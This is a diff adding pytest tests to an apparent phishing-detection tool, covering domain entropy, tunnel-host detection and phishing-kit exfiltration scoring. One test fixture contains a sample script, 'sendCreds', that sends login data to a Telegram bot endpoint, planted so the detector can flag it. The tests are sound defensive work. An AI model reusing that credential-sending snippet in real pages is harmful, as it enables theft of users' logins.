@@ -33,6 +33,7 @@ from phishlens.agents.url_agent.core.homograph_engine import (
     HomographEngine,
     HomographResult,
     analyze_homograph_and_brands,
+    calculate_shannon_entropy,
     confusable_skeleton,
 )
 from phishlens.agents.url_agent.core.ssl_analyzer import (
@@ -562,3 +563,88 @@ async def test_orchestrator_network_fallback_resilience():
         assert isinstance(res, URLAgentOutput)
         assert res.threat_level in ["SAFE", "SUSPICIOUS"]
         assert len(res.signals) >= 1
+
+
+# =============================================================================
+# 7. ADVANCED HEURISTICS: ENTROPY, TUNNELERS, AND WEBHOOK EXFILTRATION
+# =============================================================================
+
+def test_shannon_entropy_calculation():
+    """Verify character Shannon entropy accurately distinguishes natural names from DGA strings."""
+    # Natural words have lower entropy
+    low_ent = calculate_shannon_entropy("google")
+    assert low_ent <= 2.5
+
+    # Random DGA-like strings have high entropy
+    high_ent = calculate_shannon_entropy("xq7z9p2m4a1b")
+    assert high_ent >= 3.5
+
+    engine = HomographEngine()
+    res = engine.analyze_domain("https://xq7z9p2m4a1b.xyz")
+    assert res.is_high_entropy is True
+    assert any("HIGH_SHANNON_ENTROPY" in s.description for s in res.signals)
+
+
+def test_tunneler_reverse_proxy_detection():
+    """Verify detection of ephemeral tunnel services often abused by phishing kits."""
+    engine = HomographEngine()
+
+    res_ngrok = engine.analyze_domain("https://banking-secure-portal.ngrok-free.app/login")
+    assert res_ngrok.is_tunneler_host is True
+    assert res_ngrok.tunneler_provider == "Ngrok"
+    assert any("EPHEMERAL_TUNNEL_SERVICE" in s.description for s in res_ngrok.signals)
+
+    res_cf = engine.analyze_domain("https://victim-verify.trycloudflare.com/auth")
+    assert res_cf.is_tunneler_host is True
+    assert "Cloudflare" in (res_cf.tunneler_provider or "")
+
+
+@pytest.mark.asyncio
+async def test_dom_telegram_bot_and_discord_webhook_exfiltration():
+    """Verify detection of phishing kit exfiltration endpoints in DOM / scripts."""
+    inspector = DOMInspector()
+
+    html_telegram = """
+    <html>
+      <script>
+        function sendCreds(u, p) {
+          fetch("https://api.telegram.org/bot123456789:ABCDEF_ghIklmnoPQR_stuvwx1234/sendMessage?text=" + u);
+        }
+      </script>
+    </html>
+    """
+    res = await inspector.inspect("https://fake-login.com", html_body=html_telegram)
+    assert res.has_exfiltration_webhook is True
+    assert len(res.exfiltration_endpoints) >= 1
+    assert any("PHISHING_KIT_EXFILTRATION" in s.description for s in res.signals)
+
+
+@pytest.mark.asyncio
+async def test_orchestrator_webhook_and_tunneler_scoring():
+    """Verify orchestrator applies weighted risk points for tunneler and webhook exfiltration."""
+    agent = URLAgent()
+
+    # Tunneler host (e.g. ngrok-free.app)
+    out_tunneler = await agent.analyze("https://account-verify.ngrok-free.app")
+    assert out_tunneler.risk_score >= 25
+    assert any("Ephemeral reverse-proxy tunnel" in rule for rule in out_tunneler.metadata["applied_rules"])
+
+    # Phishing Kit with Telegram exfiltration
+    dom_exfil = DOMInspectionResult(
+        favicon_hash=None,
+        matched_brand=None,
+        is_brand_favicon_mismatch=False,
+        has_password_input=True,
+        has_payment_input=False,
+        cross_domain_form_actions=[],
+        has_exfiltration_webhook=True,
+        exfiltration_endpoints=["https://api.telegram.org/bot123:abc/sendMessage"],
+    )
+    with patch.object(agent.homograph_engine, "analyze", return_value=None), \
+         patch.object(agent.redirect_tracer, "trace_redirects", return_value=None), \
+         patch.object(agent.ssl_analyzer, "analyze", return_value=None), \
+         patch.object(agent.dom_inspector, "inspect", return_value=dom_exfil):
+
+        out_exfil = await agent.analyze("https://evil-phish.com")
+        assert out_exfil.risk_score >= 50
+        assert any("Active Phishing Kit Exfiltration" in rule for rule in out_exfil.metadata["applied_rules"])
